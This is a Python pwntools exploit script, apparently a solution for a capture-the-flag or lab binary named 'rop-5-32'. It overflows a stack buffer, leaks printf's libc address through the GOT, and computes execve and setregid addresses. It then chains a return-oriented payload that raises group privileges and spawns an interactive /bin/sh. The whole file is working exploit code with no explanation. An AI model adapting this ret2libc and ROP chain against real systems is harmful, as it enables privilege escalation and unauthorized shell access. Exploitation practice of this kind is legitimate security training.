#!/usr/bin/env python

from pwn import *

p = process("./rop-5-32")

got_of_printf = p.elf.got['printf']
printf_at_plt = p.elf.plt['printf']
input_func = p.elf.symbols['input_func']

buf = "A" * 0x88 + "BBBB"

buf += p32(printf_at_plt)
buf += p32(input_func)
buf += p32(got_of_printf)

p.recv()
p.sendline(buf)
data = p.recv()
raw_data = data[len(buf) + 9:]
libc_printf = u32(raw_data[:4])

"""
pwndbg> print execve
$1 = {<text variable, no debug info>} 0xf7e817e0 <execve>
pwndbg> print printf
$2 = {<text variable, no debug info>} 0xf7e1a670 <__printf>
"""
offset = 0xf7e817e0 - 0xf7e1a670

libc_execve = libc_printf + offset
libc_setregid = libc_execve + 192016
binsh_addr = p32(0x8048028)
if os.path.exists("4"):
    os.unlink("4")
os.symlink("/bin/sh","4")

"""0x080485da : pop edi ; pop ebp ; ret """
buf = "A" * 0x88 + "BBBB"
buf += p32(libc_setregid)
buf += p32(0x080485da)
buf += p32(50008)*2
buf += p32(libc_execve)
buf += p32(0)
buf += binsh_addr
buf += p32(0)*2

p.sendline(buf)
p.interactive()
